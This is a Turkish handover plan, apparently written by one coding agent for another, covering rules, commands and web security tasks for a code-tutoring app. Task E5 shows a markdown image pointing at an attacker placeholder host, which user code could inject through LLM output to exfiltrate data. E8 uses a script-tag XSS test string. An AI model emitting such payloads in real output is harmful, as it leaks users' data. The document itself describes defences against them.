# Devir belgesi — Faz E, F, G, H (+ isteğe bağlı J) · Antigravity için

> **Bu belge kimin için:** Antigravity (ya da başka bir kodlama ajanı).
> **Kim yazdı:** Claude Code, 2026-10-13. Başlangıç durumu: main'in son commit'i (bu belgeyi içeren), `v0.1.1` yayında,
> CI yeşil, `uv run pytest -m "not live"` → 3.350'den fazla test geçiyor (kendi makinende ilk iş bunu koşup sayıyı not et).
> **İş bitince:** Claude Code her maddeyi tek tek denetleyecek (§13). Uydurma sayı yazma, yapmadığın
> şeye "yaptım" deme. Önceki iki devirde (Mimo, GLM) rapordaki sayılar uydurmaydı; hepsi yakalandı
> ve iş geri alındı. Dürüst "yapamadım" her zaman kabul edilir; yanlış "yaptım" edilmez.

---

## İçindekiler

0. [Önce bunu oku: 14 kural](#0-önce-bunu-oku-14-kural)
1. [Kurulum ve komutlar](#1-kurulum-ve-komutlar)
2. [Her madde için çalışma akışı (adım adım)](#2-her-madde-için-çalışma-akışı)
3. [Bilinen tuzaklar](#3-bilinen-tuzaklar)
4. [Projenin kısa haritası](#4-projenin-kısa-haritası)
5. [Faz E — Web: geçmiş, silme, güvenlik başlıkları](#5-faz-e--web)
6. [Faz F — Masaüstü sağlamlık ve kullanılabilirlik](#6-faz-f--masaüstü)
7. [Faz G — Sağlayıcı sağlamlığı ve kod temizliği](#7-faz-g--sağlayıcı-ve-kod-temizliği)
8. [Faz H — Statik kurallar ve analiz doğruluğu](#8-faz-h--statik-kurallar)
9. [Faz I — YAPMA](#9-faz-i--yapma)
10. [Faz J — İsteğe bağlı küçük işler](#10-faz-j--isteğe-bağlı)
11. [Kullanıcının kendi yapacakları (sen dokunma)](#11-kullanıcının-kendi-yapacakları)
12. [Teslim raporu şablonu](#12-teslim-raporu-şablonu)
13. [Claude Code'un denetimde bakacakları](#13-claude-codeun-denetimde-bakacakları)
14. [Bir şey ters giderse](#14-bir-şey-ters-giderse)

**Sıra:** E → F → G → H. Her faz ayrı dal. Bir fazı bitirmeden ötekine geçme.
**Küçük commit'ler:** her madde (ya da yakından ilgili 2-3 madde) bitince commit'le
(`fix(faz-e): E1-E2 analiz listesi ve toplu silme`). Token biterse yapılan iş kaybolmasın.
Yarım kalan maddeyi commit'leme; `git stash` ile kenara koy ve raporda "yarım" yaz.

---

## 0. Önce bunu oku: 14 kural

1. **`AGENTS.md`'yi ve `docs/mimari.md`'nin içindekiler bölümünü oku.** `AGENTS.md` bu belgenin üstündedir.
2. **Mimariden sapma.** Bir maddeyi yapmak mimariyi değiştirmeyi gerektiriyorsa (yeni katman, yeni
   bağımlılık, veri modelinde büyük değişiklik) DUR, maddeyi atla, rapora "sapma gerekiyor: …" yaz.
   Yeni ADR yazma; Claude Code yazar.
3. **main'e dokunma.** `git merge` main'e, `git push`, `git tag` YOK. Her şey yerel faz dallarında kalır.
4. **Yeni bağımlılık ekleme** (pyproject ya da package.json). Gerekiyorsa rapora öneri olarak yaz.
5. **Her yeni davranış testle gelir.** "Bitti" = test yeni kodla geçiyor VE düzeltme geri alınınca
   düşüyor (§2 adım 7).
6. **Var olan testi gevşetme.** Bir testi silmek, `skip`/`xfail` eklemek, beklentiyi değiştirmek,
   süre eşiğini büyütmek YASAK. Var olan bir test senin değişikliğinle kırılıyorsa: önce testin neyi
   koruduğunu anla. Davranış bilinçli olarak değiştiyse (madde bunu istiyorsa) testi güncelle ve
   rapora "şu test şu yüzden güncellendi" yaz. Emin değilsen değişikliği geri al.
7. **Testler ağa çıkmaz.** LLM çağıran her şey `FakeProvider` ile test edilir
   (`src/codementor/providers/fake.py`). `claude`, `agy`, `codex`, `ollama` komutlarını ve gerçek
   API'leri ÇALIŞTIRMA. `@pytest.mark.live` testlerini koşma.
8. **Docker yok. Ollama yok.** Hiçbir yerde önerme, kullanma.
9. **Model adları, anahtarlar, URL'ler koda gömülmez.** Yeni ayar gerekiyorsa `src/codementor/config.py`
   içindeki ilgili `BaseModel` sınıfına alan + `codementor.toml`'a yorumlu satır + `docs/mimari.md`
   §17'ye bir satır.
10. **Kullanıcı kodu güvenilmeyen veridir** (mimari §12). Çalıştırılmaz; prompt'a `guard` süzgecinden
    geçerek girer (`src/codementor/prompts/templates.py::guard_delimiters`).
11. **Kullanıcıya dönük her metin Türkçe;** tanımlayıcılar İngilizce. Hata mesajları Türkçe.
12. **Tip:** tüm fonksiyonlarda tip ipucu; `uv run mypy src/` (strict) temiz. Pydantic modelleri
    yalnız `src/codementor/models/` altında tanımlanır.
13. **400 satır:** 400 satırı geçen dosyaya özellik ekleme; önce böl (F0, G0).
14. **Commit mesajı:** `feat(faz-e): …`, `fix(faz-f): …`, `test(faz-g): …`, `refactor(faz-f): …`.
    Mesaja Claude/AI/Antigravity atfı, `Co-Authored-By`, "Generated with" satırı EKLEME.

---

## 1. Kurulum ve komutlar

Depo kökü: `C:\Users\Burak\Desktop\Application\CodeMentor AI` (yolda boşluk var; tırnak kullan).

```powershell
uv sync                     # Python 3.12 + bağımlılıklar (.venv)
cd web; npm ci; cd ..       # web bağımlılıkları (Faz E için)
```

### 1.1 Dört denetim (her commit'ten önce hepsi yeşil)

```powershell
uv run ruff check .
uv run ruff format --check .          # biçim hatası varsa: uv run ruff format .
uv run mypy src/
uv run pytest -m "not live"           # ~2,5 dk; ağa çıkmaz
```

### 1.2 Web denetimleri (Faz E'de)

```powershell
cd web
npm run typecheck
npm test                              # Vitest (birim)
npm run build
npx playwright test e2e/app.spec.ts   # e2e; API taklit edilir. live.spec.ts'i KOŞMA
cd ..
```

### 1.3 Şema ve tip üretimi (bir Pydantic modeline alan ekledin/değiştirdinse ZORUNLU)

```powershell
uv run codementor schema export --out schemas/
cd web; npm run gen:types; cd ..
git diff --stat schemas/ web/src/types/   # değişiklikleri gör, commit'e kat
```

CI, `web/src/types`'ın şemadan üretilenle aynı olduğunu denetler; unutursan CI kırılır.
`tests/unit/test_schema_export.py` de `schemas/`'ın güncel olduğunu denetler.

### 1.4 Sık kullanılanlar

```powershell
uv run pytest -q tests/unit/test_storage.py           # tek dosya
uv run pytest -q -k "delete_all"                       # isimle
uv run pytest -q tests/unit/test_storage.py::test_x    # tek test
uv run pytest --update-golden tests/golden             # golden güncelle (bkz. §3.6)
uv run codementor --help                               # CLI
uv run codementor serve                                # API (elle deneme için; testlerde değil)
uv run python -m codementor.desktop                    # masaüstü (elle deneme)
```

---

## 2. Her madde için çalışma akışı

1. **Dal (zincir):** dallar birbirinin üstüne açılır, çünkü sonraki fazlar öncekilerin kodunu kullanır
   (ör. F6, E1'deki `list_analyses_page`'i kullanır):
   - Faz E: `git switch main` → `git switch -c faz/e-web`
   - Faz F: `git switch faz/e-web` → `git switch -c faz/f-masaustu`
   - Faz G: `git switch faz/f-masaustu` → `git switch -c faz/g-saglayici`
   - Faz H: `git switch faz/g-saglayici` → `git switch -c faz/h-kurallar`

   Bir faz yarım kaldıysa (ör. E'nin bazı maddeleri yapılamadı) yine de onun dalından devam et; yarım
   maddeyi raporda belirt. Bir fazın değişikliğini (testler dahil) karşılaştırmak için:
   `git diff faz/e-web...faz/f-masaustu` (önceki dal...bu dal).
2. **Maddeyi oku:** "Neden / Nerede / Ne yap / Test / Kabul" kısımlarının hepsini.
3. **Kodu bul ve oku:** satır numaraları kayabilir; her maddede bir `rg`/`grep` ipucu var.
   Değiştireceğin fonksiyonun **tüm çağıranlarını** bul: `rg -n "fonksiyon_adi" src tests`.
4. **Önce testi yaz**, eski kodla koş → DÜŞMELİ (düşmüyorsa test yanlış şeyi ölçüyor).
5. **Kodu yaz.** Mevcut desenleri taklit et (her maddede "örnek al" diye gösterildi).
6. **Dört denetim** (§1.1). Kırmızıysa düzelt. Testi gevşetme (kural 6).
7. **Mutasyon kontrolü:** `git stash push -- <değiştirdiğin kaynak dosya(lar)>` → yeni testi koş →
   DÜŞMELİ → `git stash pop`. Sonra `git stash list` boş olmalı. Raporda "geri alınınca N test düştü".
8. **Belgeler:**
   - `docs/BulgularVeDuzeltilecekler.md` §10'daki ilgili maddeyi `- [x]` yap, sonuna `— **Faz E**`.
   - `PROGRESS.md`: fazın ilk commit'inde "Durum" tablosuna satır
     (`| E | 🚧 | faz/e-web | <tarih> | Antigravity / — |`), fazın sonunda `✅`. Notlar bölümü:
     "## Durum" tablosunun hemen ALTINA, şu an en üstte duran "## Denetim — Faz A1-D" başlığından ÖNCE
     (en yeni en üstte) "## Faz E — Notlar (…; <tarih>)" bölümü: **Yapılanlar / Kararlar / Doğrulama
     (gerçek komut çıktısı) / Açık kalanlar**. Sonraki fazın notu bir öncekinin üstüne gelir.
     Diğer fazların notlarına bak, aynı biçimi kullan.
   - Davranışı README'de anlatılan bir şeyi değiştirdiysen README'yi (ve gerekiyorsa `README.en.md`'yi)
     güncelle.
9. **Commit** (kural 14).
10. **Teslim raporuna** o maddeyi işle (§12). Raporu en sonda değil, ilerledikçe doldur.

---

## 3. Bilinen tuzaklar

Her biri bu projede gerçekten yaşandı.

### 3.1 Linux CI'da `tkinter` yok (en son 2026-10-13'te CI'ı kırdı)
- CI'daki Ubuntu Python'unda `tkinter` yok. Şu modüller tkinter'sız İÇE AKTARILABİLMELİ:
  `desktop/questions_controller.py`, `desktop/self_check.py`, `desktop/runtime.py`,
  `desktop/config_writer.py`, `desktop/viewmodel.py`, `cli/main.py`, `api/app.py`
  (liste: `tests/unit/test_tkinter_free_imports.py::MODULES`).
- Bu modüllerin **en üstüne** `customtkinter`, `tkinter` ya da `desktop/views/*`, `desktop/widgets/*`
  içe aktarması KOYMA. Gerekiyorsa fonksiyonun içinde içe aktar. Örnek:
  `desktop/questions_controller.py::open_add` (`from codementor.desktop.views.question_form import QuestionForm` fonksiyonun içinde).
- Yeni bir tkinter'sız modül (ör. F0'daki controller'lar) eklersen `MODULES` listesine ekle.
- Pencere açan yeni bir test dosyası (`tests/desktop/test_*.py`, `App` açıyorsa) eklersen
  `tests/desktop/conftest.py`'deki `collect_ignore` listesine ekle.
- **Yerelde Linux taklidi** (fazın sonunda bir kez koş):
  1. Bir dosya oluştur: `C:\Users\Burak\AppData\Local\Temp\notk\block_tk.py`, içeriği:
     ```python
     import sys

     for _name in ("tkinter", "customtkinter", "_tkinter", "tkinterdnd2"):
         sys.modules[_name] = None
     ```
  2. `$env:PYTHONPATH="C:\Users\Burak\AppData\Local\Temp\notk"; uv run pytest -p block_tk -m "not live" -q; Remove-Item Env:PYTHONPATH`
  3. Toplama (collection) hatası olmamalı; "N passed" görmelisin.

### 3.2 Ortam değişkeni ve kullanıcı dizini
- `desktop/runtime.writable_config_file()` `CODEMENTOR_CONFIG_FILE`'ı süreç ortamına yazar;
  `tests/conftest.py::_restore_config_env` her testten sonra geri alır.
- Testte ortam değişkeni için HER ZAMAN `monkeypatch.setenv/delenv` kullan, `os.environ[...] = …` değil.
- Testler gerçek `~/.codementor` dizinine YAZMAMALI. `tests/conftest.py` şu yalıtımları zaten yapıyor:
  `_isolated_toolchain_dir`, `_isolated_user_questions`, `_isolated_user_config`. Yeni bir
  `~/.codementor/...` yolu eklersen aynı deseni uygula: `config.py`'de `_default_xxx()` fonksiyonu +
  `tests/conftest.py`'de onu geçici dizine çeviren autouse fikstür.
- Doğrulama: test koşusundan önce ve sonra `Get-ChildItem ~/.codementor` aynı olmalı.

### 3.3 Windows'ta kaçış karakterleri bozuluyor
- Kaynağa `\n`, `\t`, `\b` gibi kaçışları heredoc ya da betikle yazarken gerçek karaktere
  dönüşebiliyor. Bir keresinde 13 regex'teki `\b` görünmez backspace olmuştu (Faz 16-A1 arası,
  aylarca fark edilmedi).
- Her commit'ten önce görünmez karakter tara (çıktı boş olmalı):
  ```powershell
  uv run python -I -c "import pathlib; [print(p) for p in list(pathlib.Path('src').rglob('*.py'))+list(pathlib.Path('tests').rglob('*.py')) if p.name!='test_normalize.py' and any((ord(c)<32 and c not in chr(10)) or ord(c) in (0xFEFF,0x200B) for c in p.read_text(encoding='utf-8'))]"
  ```
- Görünmez ya da benzer görünen karakter gerekiyorsa kaynağa `chr(0x...)` ile yaz
  (örnek: `src/codementor/prompts/templates.py::_CONFUSABLES`).

### 3.4 Regex süresi (ReDoS)
- Kullanıcı kodu 40 KB'a kadar. `\s*X?\s*` gibi ardışık tekrarlar ve `re.M` + `^\s*` karesel olur.
- Yeni ya da değiştirdiğin her regex için 40 KB'lık kötü niyetli girdiyle süre testi ekle (`< 0.25 sn`).
  Örnek: `tests/unit/test_prompt_role_tags.py::test_guard_is_linear_on_adversarial_input` ve
  `tests/unit/test_detect.py` içindeki süre testleri.
- Python 3.12'de iyelik nicelikleri (`\s*+`, `[^x]++`) var; geri izlemeyi keser.
- Parametreli testte 40 KB'lık girdiye mutlaka `ids=[...]` ver; yoksa test adı 40 KB olur ve Windows'ta
  kurulum hatası verir.

### 3.5 Satır sınırı
- Şu an: `desktop/app.py` 505, `pipeline/orchestrator.py` 465, `pipeline/passes.py` 426 satır.
  Bunlara yeni özellik EKLEME; F0 ve G0 önce yapılır.
- Satır sayısı: `(Get-Content src\codementor\desktop\app.py).Count`

### 3.6 Golden testler
- `tests/golden/` çıktıyı birebir karşılaştırır (prompt anlık görüntüleri, olgular, rapor örneği).
- Bilinçli bir değişiklikse: `uv run pytest --update-golden tests/golden` → `git diff tests/golden`
  ile oku → rapora "golden şu yüzden değişti" yaz. Bilinçsiz değişiklikse kodunu düzelt.

### 3.7 Sürüm
- Sürüm yalnız `src/codementor/__init__.py`'de. Sürümü DEĞİŞTİRME, `CHANGELOG.md`'ye DOKUNMA
  (yeni release kullanıcı + Claude Code kararı; değişiklik listesini Claude Code teslim raporundan yazar).
  DİKKAT: `CHANGELOG.md`'nin en üstüne `## [Yayımlanmadı]` gibi bir başlık eklemek
  `tests/unit/test_release_readiness.py::test_changelog_top_entry_is_current_version` testini kırar.

### 3.8 `git stash` dikkat
- Mutasyon kontrolünden sonra `git stash pop` unutulursa değişikliğin kaybolmuş gibi görünür.
  Her seferinde `git stash list` boş mu bak. Doluysa `git stash pop`.

### 3.9 Masaüstü testleri
- Pencere açan testler `tests/desktop/test_app.py`'deki `_open(core, prefs_dir, store)` yardımcısını
  ve `app` fikstürünü kullanır (örnek: `tests/desktop/test_user_questions_app.py`).
- `messagebox`, `filedialog`, `app.confirm` gibi kullanıcı etkileşimlerini testte `monkeypatch` ile
  taklit et (`app.confirm = lambda *_a, **_k: True`).

---

## 4. Projenin kısa haritası

| Klasör | Ne var |
|---|---|
| `src/codementor/api/` | FastAPI uygulaması: `app.py` (kurulum, ara katmanlar), `routes.py` (uçlar), `auth.py` (API anahtarı), `guard.py` (Host/gövde sınırı), `errors.py` (Problem JSON) |
| `src/codementor/storage/` | SQLite: `db.py` (`Database`, tablolar), `cache.py` (analiz kaydı/okuma/silme), `sessions.py` (ipucu merdiveni) |
| `src/codementor/desktop/` | CustomTkinter masaüstü: `app.py` (ana pencere), `launch.py` (giriş), `runtime.py` (dizinler, tercihler), `*_controller.py` (mantık), `views/`, `widgets/` |
| `src/codementor/pipeline/` | Analiz hattı: `orchestrator.py`, `passes.py` (LLM geçişleri), `stages.py`, `signature.py` (önbellek imzası), `assemble.py` |
| `src/codementor/providers/` | LLM sağlayıcıları: `cli_agent.py` (claude/agy), `codex_cli.py`, `anthropic.py`, `openai_compat.py`, `fake.py` (testler) |
| `src/codementor/rules/` | Statik kurallar (dil başına dosya) + `registry.py` |
| `src/codementor/verify/` | Doğrulama: `schema_check.py`, `proof.py`, `leak_guard.py`, `analysis.py` |
| `src/codementor/models/` | TÜM Pydantic modelleri |
| `web/src/` | React + Monaco: `App.tsx`, `api/client.ts`, `lib/markers.ts`, `lib/download.ts`, `components/` |
| `tests/` | `unit/`, `integration/` (orkestratör + FakeProvider), `api/` (httpx ASGI), `desktop/`, `rules/`, `golden/` |

---

## 5. Faz E — Web

**Dal:** `faz/e-web` · **Faz commit önerisi:** `feat(faz-e): web geçmişi, silme ve güvenlik başlıkları`
**Neden:** README web'de geçmiş/silme varmış gibi anlatıyordu ama yoktu (bulgu O1). Web'de güvenilmeyen
markdown (O15) ve eksik güvenlik başlıkları (O16) var.

**Önce oku:**
- `src/codementor/api/routes.py` — tüm uçlar. `DELETE /v1/analyses/{analysis_id}` (~satır 216,
  `delete_stored`) ve `GET /v1/analyses/{analysis_id}` (`get_stored`) zaten var: **örnek al**.
  Hatalar `ApiProblemError(status, "Türkçe mesaj")` ile; yanıt şemaları `_problems(404)` ile belgelenir.
- `src/codementor/api/auth.py` — `install_api_key`: anahtar tanımlıysa `PROTECTED_PREFIX = "/v1/"`
  ile başlayan her yolu korur. Yeni `/v1/...` uçların **otomatik korunur**, ayrı bir şey yazma.
- `src/codementor/api/app.py::create_app` — ara katman sırası (son eklenen en dışta).
- `src/codementor/storage/cache.py` — `list_analyses(db, limit=50)`, `delete_analysis`, `clear_analyses`.
- `src/codementor/storage/sessions.py` — `clear_sessions`.
- `tests/api/conftest.py` — `client_for(provider=None, cfg=None)` fikstürü (httpx + ASGI, ağsız).
- `tests/api/test_api_auth.py` — anahtar testi deseni (`monkeypatch.setenv(KEY_ENV, KEY)` + `_with_key`).
- `tests/api/test_storage_api.py` — kayıtlı analiz okuma/silme testleri.
- `web/src/api/client.ts` — `request()` yardımcısı, `ApiError`.
- `web/src/lib/markers.ts`, `web/src/lib/download.ts`, `web/index.html`, `web/vite.config.ts`
  (geliştirmede `/v1` ve `/health` 127.0.0.1:8000'e proxy'lenir → web ve API aynı köken).
- `web/e2e/app.spec.ts` — Playwright deseni (`page.route` ile API taklidi, `src/test-fixtures.ts`).

### E1 — `GET /v1/analyses` (sayfalı liste)
- **Neden:** Web'in geçmiş göstermesi için liste ucu yok.
- **Nerede:** model `src/codementor/models/api.py`; depolama `storage/cache.py`; uç `api/routes.py`.
- **Ne yap:**
  1. `models/api.py`'ye ekle:
     ```python
     class AnalysisSummary(StrictModel):
         """Geçmiş listesindeki bir satır; rapor gövdesi ve kod içermez."""

         analysis_id: str
         created_at: datetime
         language: Language
         engine: Engine
         question_id: str | None
         provider: str | None
         degraded: bool
         early_exit: bool
         tokens_in: int
         tokens_out: int


     class AnalysisPage(StrictModel):
         items: list[AnalysisSummary]
         next_cursor: str | None = Field(description="Sonraki sayfa için `before` değeri; yoksa null")
     ```
     (`StrictModel`, `datetime`, `Language`, `Engine` içe aktarmalarını dosyadaki desene göre ekle.)
  2. `storage/cache.py`'ye `list_analyses_page(db, *, limit: int, before: str | None) -> tuple[list[AnalysisRow], str | None]`:
     sıralama `created_at` azalan, eşitlikte `id` azalan (mevcut budama sorgusundaki gibi).
     `before` verilirse o kimliğin satırını bul; ondan **sonra gelenleri** döndür (aynı `created_at`'ta
     `id` küçük olanlar dahil). `limit + 1` satır çek; fazlası varsa `next_cursor` = son döndürülen
     satırın `id`'si. `before` bulunamazsa boş sayfa.
  3. `api/routes.py`'ye uç:
     ```python
     @router.get("/v1/analyses", response_model=AnalysisPage, tags=["analiz"])
     def list_stored(
         request: Request,
         limit: Annotated[int, Query(ge=1, le=100)] = 20,
         before: Annotated[str | None, Query(pattern=ULID_PATTERN)] = None,
     ) -> AnalysisPage: ...
     ```
     DİKKAT: bu uç `"/v1/analyses/{analysis_id}"` ile çakışmaz ama `routes.py`'de yerini o ucun
     ÜSTÜNE koy.
  4. Rapor gövdesini (`report_json`) listede DÖNDÜRME (kod parçaları içerir).
- **Test** (`tests/api/test_analyses_list.py`, yeni dosya; `pytestmark = pytest.mark.anyio`):
  - `test_empty_list` → `{"items": [], "next_cursor": None}`
  - `test_order_newest_first` → 3 analiz (FakeProvider ile `POST /v1/analyze` ya da doğrudan
    `cache.save_analysis`) → kimlikler en yeni önce.
  - `test_pagination` → `limit=2` → 2 öğe + `next_cursor`; `before=<cursor>` → kalan 1, cursor null.
  - `test_limit_bounds` → `limit=0` ve `limit=101` → 422.
  - `test_list_requires_key_when_configured` → anahtar tanımlı, başlıksız → 401.
  - `test_list_has_no_code` → yanıt metninde kaydedilen kodun benzersiz bir dizesi yok.
- **Kabul:** testler + `schemas/` ve `web/src/types` yeniden üretildi (§1.3).

### E2 — `DELETE /v1/analyses` (toplu) ve `DELETE /v1/sessions/{session_id}`
- **Nerede:** `api/routes.py`, `storage/cache.clear_analyses`, `storage/sessions.py`.
- **Ne yap:**
  1. `DELETE /v1/analyses` → `clear_analyses(db)`; yanıt 200 `{"deleted": n}` (model `models/api.py`'de
     `DeletedCount(StrictModel): deleted: int`).
  2. `storage/sessions.py`'ye `delete_session(db, session_id) -> bool` (o oturumun TÜM satırları).
     `DELETE /v1/sessions/{session_id}` → silindiyse 204, yoksa 404 (`ApiProblemError(404, "…oturum bulunamadı.")`).
     `session_id` doğrulaması: `models/request.py`'deki `session_id` alan kuralını kullan (desen/uzunluk).
- **Test:** `test_delete_all_analyses` (2 kayıt → `deleted: 2` → liste boş); `test_delete_all_requires_key`;
  `test_delete_session` (oturumla 2 analiz → sil → aynı oturumla yeni analiz `socratic.hint_level`
  yeniden başlangıç seviyesinde; desen için `tests/integration/test_pipeline_sessions.py`);
  `test_delete_unknown_session_404`.

### E3 — Web'de geçmiş paneli
- **Nerede:** yeni `web/src/components/HistoryPanel.tsx` (+ `HistoryPanel.test.tsx`), `web/src/api/client.ts`,
  `web/src/App.tsx` (paneli yerleştir), `web/src/styles.css`.
- **Ne yap:**
  1. `client.ts`'ye: `listAnalyses(limit, before?)`, `getAnalysis(id)` (varsa kullan), `deleteAnalysis(id)`,
     `deleteAllAnalyses()`. Hepsi mevcut `request()` yardımcısını kullanır (hata mesajları Türkçe gelir).
     Tipler `web/src/types/`'tan (elle tip YAZMA; §1.3 ile üret).
  2. Panel: tarih (yerel saat), dil, soru kimliği ya da "Serbest çalışma", sağlayıcı, token
     (`usage.ts::formatCount`). "Daha fazla" düğmesi `next_cursor` ile. Satıra tıklayınca rapor açılır
     (App'teki rapor durumuna yazılır). Satır başına "Sil"; üstte "Tümünü temizle"
     (`window.confirm("Tüm analiz geçmişi silinecek. Emin misin?")`).
  3. Açık olan rapor silinirse ekrandaki rapor temizlenir.
  4. Liste boşsa "Henüz analiz yok."; hata olursa `ApiError` mesajı.
- **Test (Vitest, `HistoryPanel.test.tsx`):** liste render; "Daha fazla" ikinci sayfayı ekler; "Sil"
  `deleteAnalysis` çağırır ve satırı kaldırır; "Tümünü temizle" confirm iptalde çağırmaz, kabulde çağırır.
  `fetch`'i `vi.fn` ile taklit et (mevcut `src/api/client.test.ts` desenine bak).
- **Test (Playwright, `e2e/app.spec.ts`'ye yeni `test(...)`):** `page.route("**/v1/analyses*", …)` ile
  liste taklidi → panel görünür → sil → `DELETE` isteği gitti.
- **Kabul:** `npm run typecheck`, `npm test`, `npm run build`, `npx playwright test e2e/app.spec.ts` yeşil.

### E4 — Web istemcisi `X-API-Key` gönderebilsin
- **Neden:** API anahtarı tanımlanırsa web şu an hiç çalışmıyor (her istek 401).
- **Ne yap:**
  1. `web/src/lib/apiKey.ts`: `getApiKey()`, `setApiKey(value)`, `clearApiKey()` — `sessionStorage`
     (`localStorage` DEĞİL; sekme kapanınca silinsin).
  2. `client.ts::request()` her istekte, anahtar varsa `X-API-Key` başlığı ekler (SSE isteği dahil).
  3. 401 gelirse `ApiError` mesajı: "API anahtarı gerekli ya da yanlış. Ayarlardan girin." ve
     arayüzde anahtar giriş alanı (şifre tipi input + "Kaydet").
- **Test (Vitest):** anahtar varken başlık gidiyor, yokken gitmiyor; 401 → Türkçe mesaj; `localStorage`
  hiç yazılmıyor (`vi.spyOn(Storage.prototype, "setItem")` ile çağrılanın `sessionStorage` olduğunu doğrula).

### E5 — O15: Monaco hover'da güvenilmeyen markdown
- **Neden:** LLM bulgu açıklaması (kullanıcı koduyla yönlendirilebilir) ve derleyici iletisi markdown
  olarak işleniyor. `![](https://saldirgan/?q=…)` hover açılınca dış istek, `[x](https://phish)`
  tıklanabilir bağlantı üretir.
- **Nerede:** `web/src/lib/markers.ts`: `lineDecorations` içinde
  `mark(line, f.severity, \`**${f.category}** — ${f.description}\`)` ve
  `mark(d.line, level, \`**${d.tool}** — ${d.message}\`)`.
- **Ne yap:** `web/src/lib/markdown.ts`:
  ```ts
  /** Monaco hover'ına düz metin olarak girecek metindeki markdown özel karakterlerini kaçışlar. */
  export function escapeMarkdown(text: string): string {
    return text.replace(/[\\`*_{}\[\]()#+\-.!|<>~]/g, (c) => `\\${c}`);
  }
  ```
  `markers.ts`'de `f.description`, `f.category`, `d.tool`, `d.message` bu fonksiyondan geçsin
  (kalın yazım için bizim eklediğimiz `**…**` işaretleri kaçışlanmasın; yalnız değişkenler).
- **Test (`markers.test.ts`'ye ekle):** `![x](http://e)` içeren açıklama → hover değerinde `](` yok
  (kaçışlı `\]\(` var); `[a](https://p)` aynı; normal Türkçe metin ("Döngü n kez döner mi?") yalnız
  `?` korunarak okunur kalıyor; `**kategori**` kalın işareti duruyor.

### E6 — O16: güvenlik başlıkları
- **Web (`web/index.html`, `<head>` içine):**
  ```html
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; worker-src 'self' blob:; connect-src 'self'; base-uri 'none'; form-action 'none'" />
  ```
  Monaco yerel paketten yüklenir (`web/src/monaco-setup.ts`, CDN yok) ve worker kullanır
  (`worker-src blob:` gerekli olabilir). Vite geliştirme sunucusu HMR için `connect-src`'ye
  `ws:` isteyebilir: dev'de kırılırsa yalnız dev için gevşetme yolu bul (ör. `vite.config.ts`'de
  `transformIndexHtml` ile build'de ekleme); prod build'de CSP olmalı. Çalışmazsa CSP'yi gevşetme,
  nedenini rapora yaz.
- **API (`api/app.py`):** yeni bir ara katman (`api/security_headers.py` içinde bir fonksiyon ya da
  `@app.middleware("http")`): her yanıta `X-Content-Type-Options: nosniff`,
  `Referrer-Policy: no-referrer`. 401/404/413 dahil tüm yanıtlarda olmalı → ara katmanı EN DIŞA
  (en son `add_middleware`) koy.
- **Test:**
  - `tests/api/test_security_headers.py`: `/health` (200), `/v1/analyses/<olmayan>` (404), anahtarlı
    modda başlıksız `/v1/rules` (401), çok büyük gövde (413) → hepsinde iki başlık var.
  - Playwright: sayfa yüklenir, `page.on("console")` ile CSP ihlali mesajı YOK, editör görünür.

### E7 — D14: anahtar varken `/health/ready`, `/docs`, `/openapi.json` korunur
- **Neden:** anahtar tanımlıyken bile bu uçlar açık; sağlayıcı/model adları ve çalıştırılabilir yolları
  (`/health/ready`) sızıyor.
- **Nerede:** `api/auth.py::install_api_key` (`PROTECTED_PREFIX` kontrolü).
- **Ne yap:** korunan yollar: `/v1/` önekli olanlar + `/health/ready`, `/docs`, `/redoc`,
  `/openapi.json`, `/docs/oauth2-redirect`. `/health` açık kalır. Bir `_is_protected(path)` fonksiyonu yaz.
- **Test (`test_api_auth.py`'ye ekle):** anahtarlı modda bu 5 yol başlıksız 401, başlıklı 200 (ya da
  ilgili normal kod); `/health` başlıksız 200; anahtarsız modda hepsi eskisi gibi açık.
  (Mevcut `test_health_stays_open` testini bozma.)

### E8 — D15: Markdown dışa aktarımında HTML kaçışı
- **Nerede:** `src/codementor/report/markdown.py` (`to_markdown`; tablo hücrelerinde yalnız `|` kaçışı var).
- **Ne yap:** LLM metni, derleyici iletisi, kanıt (`evidence`) DIŞINDAKİ serbest metinlerde `&` → `&amp;`,
  `<` → `&lt;`, `>` → `&gt;`. **Kod blokları (```) ve satır içi kod (`…`) İÇİ olduğu gibi kalır**;
  kanıt zaten satır içi kod olarak yazılıyorsa dokunma. Tek bir `_escape_html(text)` yardımcısı yaz,
  metnin geçtiği yerlerde çağır.
- **Test (`tests/unit/test_report_render.py`'ye ekle):** açıklamada `<script>alert(1)</script>` →
  Markdown'da `&lt;script&gt;`; kanıt kod bloğundaki `#include <stdio.h>` aynen kalıyor;
  `a & b` → `a &amp; b`. Rapor golden'ı değişirse §3.6.

### E9 — D17: indirme URL'si gecikmeli iptal
- **Nerede:** `web/src/lib/download.ts::saveBlob` (son satır `URL.revokeObjectURL(url)` hemen çağrılıyor).
- **Ne yap:** `setTimeout(() => URL.revokeObjectURL(url), 1000);`
- **Test (yeni `download.test.ts`):** `vi.useFakeTimers()`; `URL.createObjectURL/revokeObjectURL`'ü
  `vi.fn` yap; `saveBlob` sonrası revoke çağrılmamış; `vi.advanceTimersByTime(1000)` sonrası çağrılmış.

### E10 — Soru filtresi boşsa mesaj
- **Nerede:** `web/src/components/Controls.tsx` (soru seçici; ~satır 43'te zorluk filtresi uygulanıyor).
- **Ne yap:** filtre sonucu boşsa seçicinin yanında "Bu filtrelerle eşleşen soru yok." metni.
- **Test (Vitest):** boş liste → metin görünür; dolu liste → görünmez.

### E11 — Dışa açık `serve` ve hız sınırı
- **Nerede:** `src/codementor/cli/serve.py`, `src/codementor/config.py::ApiSettings`,
  `src/codementor/api/routes.py::_admit` (eşzamanlı analiz sınırı burada).
- **Ne yap:**
  1. `serve`: `--host` `127.0.0.1`, `localhost`, `::1` DIŞINDA ve API anahtarı (`configured_key`)
     yoksa: "Dışa açık adrese anahtarsız bağlanılamaz. [api] api_key_env ayarlayın ya da --insecure
     verin." + çıkış 3. `--insecure` bayrağı varsa sarı uyarıyla başlar.
  2. `ApiSettings.rate_limit_per_minute: int | None = Field(default=30, ge=1)` (None = kapalı).
     `_admit` içinde istemci IP'si (`request.client.host`) başına son 60 sn'deki analiz sayısı
     (bellek içi `collections.deque` sözlüğü, `threading.Lock` ile). Aşılırsa
     `ApiProblemError(429, "Çok fazla istek; bir dakika sonra yeniden deneyin.")` + `Retry-After: 60`.
  3. `codementor.toml`'a `[api]` altına yorumlu `rate_limit_per_minute = 30`; mimari §17'ye bir satır.
- **Test:**
